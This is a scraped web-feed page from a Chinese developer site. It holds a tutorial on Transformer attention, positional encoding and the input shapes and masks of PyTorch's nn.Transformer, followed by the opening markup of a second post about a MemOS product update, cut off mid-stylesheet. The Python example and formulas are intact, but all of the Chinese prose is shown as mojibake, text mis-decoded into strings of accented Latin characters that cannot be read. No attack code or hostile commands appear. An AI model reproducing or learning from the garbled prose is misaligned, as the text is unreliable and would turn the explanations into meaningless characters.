                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¯¼è¯»</h2>
<p>Transformer ä¹‹æ‰€ä»¥é‡è¦ï¼Œä¸åªæ˜¯â€œæ›´å¼ºçš„æ¨¡å‹â€ï¼Œè€Œæ˜¯å®ƒç”¨æ³¨æ„åŠ›è®©åºåˆ—è®¡ç®—å¯ä»¥å¹¶è¡ŒåŒ–ï¼Œå¹¶ä¸”æŠŠâ€œä¾èµ–å…³ç³»å»ºæ¨¡â€å˜æˆäº†å¯è§£é‡Šã€å¯æ§åˆ¶çš„æ“ä½œã€‚æœ¬æ–‡ä»å…¬å¼ä¸ç»“æ„è®²æ¸…æ¥šæ ¸å¿ƒæœºåˆ¶ï¼Œå†è½åˆ° PyTorch <code>torch.nn.Transformer</code> çš„è¾“å…¥å½¢çŠ¶ä¸ mask è¯­ä¹‰ï¼Œå¸®åŠ©ä½ æŠŠæ¦‚å¿µè½¬æˆå¯è¿è¡Œçš„å·¥ç¨‹å®ç°ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ä»åºåˆ—å»ºæ¨¡ç“¶é¢ˆè¯´èµ·</h2>
<p>ä¼ ç»Ÿ RNN/GRU/LSTM é€æ­¥å¤„ç†åºåˆ—ï¼Œæ—¶é—´å¤æ‚åº¦è™½ç„¶çº¿æ€§ï¼Œä½†è®¡ç®—æ— æ³•å¹¶è¡Œï¼Œè€Œä¸”é•¿è·ç¦»ä¾èµ–å®¹æ˜“è¢«æ¢¯åº¦ç¨€é‡Šã€‚Transformer çš„å…³é”®çªç ´æ˜¯ï¼šç”¨æ³¨æ„åŠ›è®©æ¯ä¸ªä½ç½®éƒ½èƒ½ç›´æ¥â€œçœ‹è§â€å…¨åºåˆ—ï¼Œä»è€Œå‡å°‘å¯¹é•¿é“¾æ¡çš„ä¾èµ–ï¼Œå¹¶æŠŠè®¡ç®—å¹¶è¡ŒåŒ–ã€‚</p>
<h2 data-id="heading-2">äºŒã€æ ¸å¿ƒå…¬å¼ï¼šç¼©æ”¾ç‚¹ç§¯æ³¨æ„åŠ›</h2>
<p>è®ºæ–‡ç»™å‡ºçš„æ ‡å‡†å…¬å¼æ˜¯ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Attention</span>(Q, K, V) = <span class="hljs-built_in">softmax</span>(QK^T / sqrt(d_k)) V
</code></pre>
<p>è¿™é‡Œçš„ç¼©æ”¾ <code>sqrt(d_k)</code> æ˜¯ä¸ºäº†é¿å…ç‚¹ç§¯å€¼è¿‡å¤§å¯¼è‡´ softmax é¥±å’Œï¼Œä»è€Œç¨³å®šè®­ç»ƒã€‚ç›´è§‰ä¸Šå¯ä»¥è¿™æ ·ç†è§£ï¼šQ ä¸ K è®¡ç®—â€œç›¸å…³æ€§å¾—åˆ†â€ï¼Œsoftmax æŠŠå¾—åˆ†å˜æˆæƒé‡ï¼Œæœ€åç”¨æƒé‡å¯¹ V åšåŠ æƒæ±‚å’Œï¼Œå¾—åˆ°â€œå½“å‰ä½ç½®åº”è¯¥çœ‹å“ªäº›ä¿¡æ¯â€çš„èšåˆç»“æœã€‚</p>
<h2 data-id="heading-3">ä¸‰ã€å¤šå¤´æ³¨æ„åŠ›ï¼šå¹¶è¡Œå­ç©ºé—´çš„ç»„åˆ</h2>
<p>å¤šå¤´æ³¨æ„åŠ›æŠŠåŸæœ¬å•ä¸€çš„æ³¨æ„åŠ›åˆ†æˆå¤šä¸ªå¤´ï¼šæ¯ä¸ªå¤´åœ¨ä¸åŒçš„çº¿æ€§æŠ•å½±ç©ºé—´é‡Œè®¡ç®—æ³¨æ„åŠ›ï¼Œæœ€åå†æ‹¼æ¥èµ·æ¥ã€‚è¿™æ ·æ¨¡å‹èƒ½åŒæ—¶æ•æ‰ä¸åŒç±»å‹çš„å…³ç³»ï¼Œä¾‹å¦‚ä½ç½®é‚»è¿‘ã€è¯­ä¹‰ç›¸ä¼¼æˆ–ç»“æ„å¯¹é½ã€‚è®ºæ–‡æŒ‡å‡ºå¤šå¤´æœºåˆ¶æ˜¯æå‡è¡¨è¾¾èƒ½åŠ›çš„å…³é”®æ­¥éª¤ï¼Œè€Œä¸æ˜¯ç®€å•çš„å¹¶è¡ŒåŠ é€Ÿã€‚</p>
<h2 data-id="heading-4">å››ã€ç¼–ç å™¨/è§£ç å™¨çš„ä¿¡æ¯æµ</h2>
<p>ç»å…¸ Transformer æ˜¯ encoder-decoder ç»“æ„ï¼š</p>
<ul>
<li>ç¼–ç å™¨å±‚åŒ…å«è‡ªæ³¨æ„åŠ›ä¸å‰é¦ˆç½‘ç»œï¼Œè´Ÿè´£æŠŠè¾“å…¥åºåˆ—ç¼–ç æˆä¸Šä¸‹æ–‡è¡¨ç¤ºã€‚</li>
<li>è§£ç å™¨å±‚åŒ…å«â€œå¸¦å› æœ mask çš„è‡ªæ³¨æ„åŠ›â€å’Œâ€œå¯¹ç¼–ç å™¨è¾“å‡ºçš„äº¤å‰æ³¨æ„åŠ›â€ï¼Œç¡®ä¿ç”Ÿæˆæ—¶åªèƒ½çœ‹åˆ°å·²ç”Ÿæˆçš„å†å²ï¼ŒåŒæ—¶èƒ½è¯»å–æºåºåˆ—ä¿¡æ¯ã€‚</li>
</ul>
<p>è¿™ç§åˆ†å·¥è®©æ¨¡å‹æ—¢èƒ½åšåºåˆ—åˆ°åºåˆ—çš„æ˜ å°„ï¼Œä¹Ÿèƒ½åœ¨è§£ç é˜¶æ®µä¿æŒè‡ªå›å½’ä¸€è‡´æ€§ã€‚</p>
<h2 data-id="heading-5">äº”ã€ä½ç½®ç¼–ç ï¼šæ²¡æœ‰é¡ºåºå°±æ²¡æœ‰è¯­ä¹‰</h2>
<p>æ³¨æ„åŠ›æœ¬èº«ä¸åŒ…å«é¡ºåºï¼Œå› æ­¤ Transformer å¿…é¡»æ˜¾å¼åŠ å…¥ä½ç½®ç¼–ç ã€‚è®ºæ–‡ä¸­çš„æ­£å¼¦ä½ç½®ç¼–ç æä¾›äº†ä¸€ä¸ªæ— éœ€è®­ç»ƒçš„æ–¹æ¡ˆï¼Œä½¿æ¨¡å‹èƒ½é€šè¿‡ä½ç½®åµŒå…¥æ„ŸçŸ¥é¡ºåºä¸ç›¸å¯¹ä½ç§»ã€‚æ— è®ºç”¨æ­£å¼¦è¿˜æ˜¯å¯è®­ç»ƒä½ç½®åµŒå…¥ï¼Œæœ¬è´¨ç›®çš„éƒ½æ˜¯è®©â€œç›¸åŒ token åœ¨ä¸åŒä½ç½®â€å¾—åˆ°åŒºåˆ†ã€‚</p>
<p>è®ºæ–‡ç»™å‡ºçš„æ­£å¼¦ä½ç½®ç¼–ç å…¬å¼ä¸ºï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">PE</span>(pos, <span class="hljs-number">2</span>i)   = <span class="hljs-built_in">sin</span>(pos / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i / d_model))
<span class="hljs-built_in">PE</span>(pos, <span class="hljs-number">2</span>i+<span class="hljs-number">1</span>) = <span class="hljs-built_in">cos</span>(pos / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i / d_model))
</code></pre>
<p>è¿™ä¸ªè®¾è®¡çš„ç›´è§‰æ˜¯ï¼šä¸åŒç»´åº¦ç”¨ä¸åŒé¢‘ç‡ç¼–ç ä½ç½®ï¼Œä½¿æ¨¡å‹èƒ½å¤Ÿé€šè¿‡çº¿æ€§ç»„åˆè¡¨è¾¾ç›¸å¯¹ä½ç§»ï¼›åŒæ—¶ä¹Ÿæ›´å®¹æ˜“å¤–æ¨åˆ°æ¯”è®­ç»ƒæ—¶æ›´é•¿çš„åºåˆ—ä½ç½®ã€‚</p>
<h2 data-id="heading-6">å…­ã€è½åˆ°å·¥ç¨‹ï¼š<code>torch.nn.Transformer</code> çš„å®šä½</h2>
<p>PyTorch å®˜æ–¹æ–‡æ¡£æ˜ç¡®æŒ‡å‡ºï¼š<code>torch.nn.Transformer</code> æ˜¯å¯¹åŸå§‹æ¶æ„çš„å‚è€ƒå®ç°ï¼ŒåŠŸèƒ½ç›¸å¯¹æœ‰é™ï¼Œæ›´å¤šé«˜æ•ˆç»“æ„éœ€åŸºäºåº•å±‚æ¨¡å—è‡ªè¡Œç»„åˆï¼ˆè§å®˜æ–¹æ–‡æ¡£è¯´æ˜ï¼‰ã€‚å› æ­¤å®ƒéå¸¸é€‚åˆæ•™å­¦ã€åŸå‹æˆ–åŸºçº¿æ¨¡å‹ï¼Œä½†ä¸ä¸€å®šæ˜¯ç”Ÿäº§æœ€ä¼˜è§£ã€‚</p>
<p>å‚æ•°æ–¹é¢ï¼Œå¸¸ç”¨é…ç½®åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>d_model</code>ï¼šè¾“å…¥/è¾“å‡ºçš„ç‰¹å¾ç»´åº¦ï¼›</li>
<li><code>nhead</code>ï¼šå¤šå¤´æ³¨æ„åŠ›å¤´æ•°ï¼›</li>
<li><code>num_encoder_layers</code> / <code>num_decoder_layers</code>ï¼šå±‚æ•°æ·±åº¦ï¼›</li>
<li><code>dim_feedforward</code>ï¼šå‰é¦ˆç½‘ç»œç»´åº¦ï¼›</li>
<li><code>dropout</code>ã€<code>activation</code>ï¼šè®­ç»ƒç¨³å®šæ€§ä¸éçº¿æ€§é€‰æ‹©ï¼›</li>
<li><code>batch_first</code>ï¼šæ˜¯å¦ä½¿ç”¨ <code>(N, S, E)</code> çš„å¼ é‡å¸ƒå±€ï¼›</li>
<li><code>norm_first</code>ï¼šæ˜¯å¦åœ¨å­å±‚å‰åº”ç”¨ LayerNormã€‚</li>
</ul>
<p>è¿™äº›å‚æ•°ç›´æ¥å†³å®šæ¨¡å‹å®¹é‡ã€è®­ç»ƒç¨³å®šæ€§ä¸æ€§èƒ½ç“¶é¢ˆã€‚</p>
<h2 data-id="heading-7">ä¸ƒã€è¾“å…¥å½¢çŠ¶ä¸ <code>batch_first</code></h2>
<p>å®˜æ–¹æ–‡æ¡£æ˜ç¡®ç»™å‡ºå½¢çŠ¶è§„åˆ™ï¼š</p>
<ul>
<li><code>batch_first=False</code>ï¼ˆé»˜è®¤ï¼‰æ—¶ï¼š<code>src</code> æ˜¯ <code>(S, N, E)</code>ï¼Œ<code>tgt</code> æ˜¯ <code>(T, N, E)</code>ï¼›</li>
<li><code>batch_first=True</code> æ—¶ï¼š<code>src</code> æ˜¯ <code>(N, S, E)</code>ï¼Œ<code>tgt</code> æ˜¯ <code>(N, T, E)</code>ï¼›</li>
<li><code>src_mask</code> å½¢çŠ¶ä¸º <code>(S, S)</code>ï¼Œ<code>tgt_mask</code> ä¸º <code>(T, T)</code>ï¼›</li>
<li><code>src_key_padding_mask</code> ä¸º <code>(N, S)</code>ï¼Œ<code>tgt_key_padding_mask</code> ä¸º <code>(N, T)</code>ã€‚</li>
</ul>
<p>è¿™é‡Œçš„ S/T æ˜¯åºåˆ—é•¿åº¦ï¼ŒN æ˜¯ batch å¤§å°ï¼ŒE æ˜¯ç‰¹å¾ç»´åº¦ã€‚å½¢çŠ¶é”™ä¸€ç»´ï¼Œæ¨¡å‹è¦ä¹ˆæŠ¥é”™ï¼Œè¦ä¹ˆæ›´éšè”½åœ°å­¦é”™ã€‚</p>
<h2 data-id="heading-8">å…«ã€Mask è¯­ä¹‰ï¼šå¸ƒå°”ä¸æµ®ç‚¹çš„å·®åˆ«</h2>
<p>PyTorch æ–‡æ¡£ç‰¹åˆ«è¯´æ˜ï¼š</p>
<ul>
<li>å½“ mask æ˜¯å¸ƒå°”å¼ é‡æ—¶ï¼Œ<code>True</code> è¡¨ç¤ºâ€œä¸å¯å‚ä¸æ³¨æ„åŠ›â€ï¼›</li>
<li>å½“ mask æ˜¯æµ®ç‚¹å¼ é‡æ—¶ï¼Œå®ƒä¼šè¢«åŠ åˆ°æ³¨æ„åŠ›æƒé‡ä¸Šï¼›</li>
<li><code>src_is_causal</code> / <code>tgt_is_causal</code> åªæ˜¯â€œå› æœ mask æç¤ºâ€ï¼Œæ–‡æ¡£è­¦å‘Šé”™è¯¯æç¤ºä¼šå¯¼è‡´ä¸æ­£ç¡®çš„æ‰§è¡Œç»“æœã€‚</li>
</ul>
<p>è¿™æ˜¯ä¸€ç±»éå¸¸å¸¸è§çš„å‘ï¼šä¸åŒåº“å¯¹ mask çš„ True/False è¯­ä¹‰ä¸åŒï¼Œä¸èƒ½æƒ³å½“ç„¶ã€‚</p>
<h2 data-id="heading-9">ä¹ã€å®è·µä»£ç ï¼šå®Œæ•´è¾“å…¥ + å› æœ mask + padding mask</h2>
<p>ä¸‹é¢ç¤ºä¾‹å±•ç¤º <code>batch_first=True</code> çš„é…ç½®æ–¹å¼ï¼Œå¹¶ä½¿ç”¨ <code>generate_square_subsequent_mask</code> ç”Ÿæˆå› æœ maskï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn

model = nn.Transformer(
    d_model=<span class="hljs-number">256</span>,
    nhead=<span class="hljs-number">8</span>,
    num_encoder_layers=<span class="hljs-number">4</span>,
    num_decoder_layers=<span class="hljs-number">4</span>,
    batch_first=<span class="hljs-literal">True</span>,
)

<span class="hljs-comment"># (N, S, E) ä¸ (N, T, E)</span>
src = torch.rand(<span class="hljs-number">32</span>, <span class="hljs-number">10</span>, <span class="hljs-number">256</span>)
tgt = torch.rand(<span class="hljs-number">32</span>, <span class="hljs-number">12</span>, <span class="hljs-number">256</span>)

<span class="hljs-comment"># (T, T) å› æœ maskï¼šè¢«é®æŒ¡ä½ç½®ä¸º -inf</span>
causal_mask = nn.Transformer.generate_square_subsequent_mask(tgt.size(<span class="hljs-number">1</span>))

<span class="hljs-comment"># padding maskï¼šTrue è¡¨ç¤ºå¿½ç•¥</span>
src_key_padding_mask = torch.zeros(<span class="hljs-number">32</span>, <span class="hljs-number">10</span>, dtype=torch.<span class="hljs-built_in">bool</span>)

y = model(
    src,
    tgt,
    tgt_mask=causal_mask,
    src_key_padding_mask=src_key_padding_mask,
)
</code></pre>
<p>è¿™æ®µä»£ç ä¸å®˜æ–¹æ–‡æ¡£ç»™å‡ºçš„ shape è§„åˆ™ä¸€è‡´ï¼Œä¹Ÿæ˜¯æ’æŸ¥è¾“å…¥é”™è¯¯æ—¶æœ€å¸¸ç”¨çš„åŸºçº¿ã€‚</p>
<h2 data-id="heading-10">åã€ä»æ³¨æ„åŠ›çŸ©é˜µç†è§£ mask çš„ä½œç”¨</h2>
<p>ç†è§£ mask çš„ä¸€ä¸ªå¥½æ–¹æ³•ï¼Œæ˜¯æŠŠæ³¨æ„åŠ›æƒé‡å½“æˆä¸€ä¸ªâ€œå¯è§†åŒ–çš„çŸ©é˜µâ€ã€‚å¯¹è‡ªæ³¨æ„åŠ›æ¥è¯´ï¼Œæƒé‡çŸ©é˜µçš„å½¢çŠ¶é€šå¸¸æ˜¯ <code>(T, T)</code> æˆ– <code>(S, S)</code>ï¼›å¯¹äº¤å‰æ³¨æ„åŠ›ï¼Œå½¢çŠ¶æ˜¯ <code>(T, S)</code>ã€‚å®˜æ–¹æ–‡æ¡£ä¹Ÿç»™å‡ºäº† <code>src_mask</code>ã€<code>tgt_mask</code>ã€<code>memory_mask</code> çš„å½¢çŠ¶å®šä¹‰ï¼Œè¿™èƒ½å¸®åŠ©ä½ åˆ¤æ–­ä¸€ä¸ª mask åº”è¯¥å¯¹åº”â€œè°çœ‹è°â€ã€‚</p>
<p>åœ¨å®ç°ä¸Šï¼Œmask ä¼šåœ¨ softmax ä¹‹å‰å½±å“æ³¨æ„åŠ›æƒé‡ï¼šå¸ƒå°” mask çš„ <code>True</code> è¡¨ç¤ºç¦æ­¢å…³æ³¨ï¼Œæµ®ç‚¹ mask ä¼šè¢«ç›´æ¥åŠ åˆ°æƒé‡ä¸Šï¼ˆé€šå¸¸ç”¨ <code>-inf</code> åšé®æŒ¡ï¼‰ã€‚å› æ­¤ä½ å¯ä»¥æŠŠ mask ç†è§£ä¸ºâ€œæŠŠæŸäº›è¾¹ä»æ³¨æ„åŠ›å›¾ä¸­å‰ªæ‰â€ã€‚å¦‚æœ mask æ–¹å‘å¼„åï¼Œæ¨¡å‹å°±ä¼šåœ¨ä¸è¯¥çœ‹çš„ä½ç½®ä¸Šâ€œå·çœ‹ç­”æ¡ˆâ€ã€‚</p>
<h2 data-id="heading-11">åä¸€ã€è®­ç»ƒä¸æ¨ç†å»ºè®®ï¼ˆé¢å‘å·¥ç¨‹ï¼‰</h2>
<ul>
<li><strong>è®­ç»ƒé˜¶æ®µ</strong>ï¼šç¡®ä¿ <code>tgt</code> æ˜¯å³ç§»åçš„è¾“å…¥åºåˆ—ï¼Œå¹¶ç”¨å› æœ mask é¿å…æ³„æ¼æœªæ¥ä¿¡æ¯ã€‚</li>
<li><strong>æ¨ç†é˜¶æ®µ</strong>ï¼šé€æ­¥ç”Ÿæˆæ—¶è¦æŒç»­æ›´æ–° <code>tgt</code>ï¼Œå¹¶å¤ç”¨ <code>generate_square_subsequent_mask</code> çš„å½¢çŠ¶è§„åˆ™ã€‚</li>
<li><strong>æ—¥å¿—è®°å½•</strong>ï¼šå»ºè®®è®°å½• <code>batch_first</code>ã€mask ç±»å‹ã€shape ä¸ dtypeï¼Œä¾¿äºå®šä½è®­ç»ƒä¸ç¨³å®šæˆ–è¾“å‡ºå¼‚å¸¸ã€‚</li>
</ul>
<h2 data-id="heading-12">åäºŒã€æ€§èƒ½ä¸è¾¹ç•Œæ¡ä»¶</h2>
<p>æ³¨æ„åŠ›çš„è®¡ç®—å¤æ‚åº¦æ˜¯ O(n^2)ï¼Œåœ¨é•¿åºåˆ—åœºæ™¯ä¼šé€ æˆæ˜æ˜¾çš„æ˜¾å­˜å’Œå»¶è¿Ÿå‹åŠ›ã€‚å®˜æ–¹æ–‡æ¡£ä¹ŸæŒ‡å‡º <code>torch.nn.Transformer</code> æ˜¯å‚è€ƒå®ç°ï¼ŒåŠŸèƒ½æœ‰é™ï¼Œå¼ºè°ƒæ›´é«˜æ•ˆçš„å®ç°åº”åŸºäºåº•å±‚æ¨¡å—æˆ– PyTorch ç”Ÿæ€åº“ã€‚</p>
<p>è¿™æ„å‘³ç€ï¼šå½“ä½ é‡åˆ°é•¿ä¸Šä¸‹æ–‡æˆ–å®æ—¶æ¨ç†ç“¶é¢ˆæ—¶ï¼Œéœ€è¦è€ƒè™‘ç¨€ç–æ³¨æ„åŠ›ã€åˆ†å—æ³¨æ„åŠ›æˆ– KV cache ç­‰ç­–ç•¥ï¼Œè€Œä¸æ˜¯â€œç›²ç›®åŠ å±‚â€ã€‚</p>
<h2 data-id="heading-13">åä¸‰ã€å¸¸è§é”™è¯¯æ¸…å•</h2>
<ul>
<li><strong>æŠŠ <code>batch_first</code> å½“æˆé»˜è®¤</strong>ï¼šé»˜è®¤æ˜¯ <code>False</code>ï¼Œè¦æ˜¾å¼è®¾ç½®å¹¶åŒ¹é…è¾“å…¥å½¢çŠ¶ã€‚</li>
<li><strong>mask è¯­ä¹‰æå</strong>ï¼šå¸ƒå°” mask çš„ True è¡¨ç¤ºâ€œä¸å¯å…³æ³¨â€ã€‚</li>
<li><strong>å¿½è§† <code>*_is_causal</code> çš„æç¤ºè¯­ä¹‰</strong>ï¼šé”™è¯¯æç¤ºä¼šå¯¼è‡´ä¸æ­£ç¡®çš„æ‰§è¡Œç»“æœã€‚</li>
<li><strong>åªè®°å¾—å…¬å¼ï¼Œä¸è®°å¾—å½¢çŠ¶</strong>ï¼šTransformer çš„å¤§éƒ¨åˆ† bug å‡ºåœ¨ shape ä¸ mask ç»„åˆä¸Šã€‚</li>
</ul>
<h2 data-id="heading-14">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpytorch.org%2Fdocs%2Fstable%2Fgenerated%2Ftorch.nn.Transformer.html" target="_blank" title="https://pytorch.org/docs/stable/generated/torch.nn.Transformer.html" ref="nofollow noopener noreferrer">pytorch.org/docs/stableâ€¦</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F1706.03762" target="_blank" title="https://arxiv.org/abs/1706.03762" ref="nofollow noopener noreferrer">arxiv.org/abs/1706.03â€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MemOS äº§å“æ›´æ–°ï½œæ”¯æŒå…¨é‡è·å–ç”¨æˆ·è®°å¿†ï¼Œè®°å¿†ç®¡ç†ä¸å¯¹è¯ä½“éªŒæå‡]]></title>    <link>https://juejin.cn/post/7594854295759274027</link>    <guid>https://juejin.cn/post/7594854295759274027</guid>    <pubDate>2026-01-14T12:07:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594854295759274027" data-draft-id="7594832320030375979" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MemOS äº§å“æ›´æ–°ï½œæ”¯æŒå…¨é‡è·å–ç”¨æˆ·è®°å¿†ï¼Œè®°å¿†ç®¡ç†ä¸å¯¹è¯ä½“éªŒæå‡"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-01-14T12:07:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MemOS"/> <meta itemprop="url" content="https://juejin.cn/user/3792632680824698"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MemOS äº§å“æ›´æ–°ï½œæ”¯æŒå…¨é‡è·å–ç”¨æˆ·è®°å¿†ï¼Œè®°å¿†ç®¡ç†ä¸å¯¹è¯ä½“éªŒæå‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3792632680824698/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MemOS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T12:07:44.000Z" title="Wed Jan 14 2026 12:07:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body 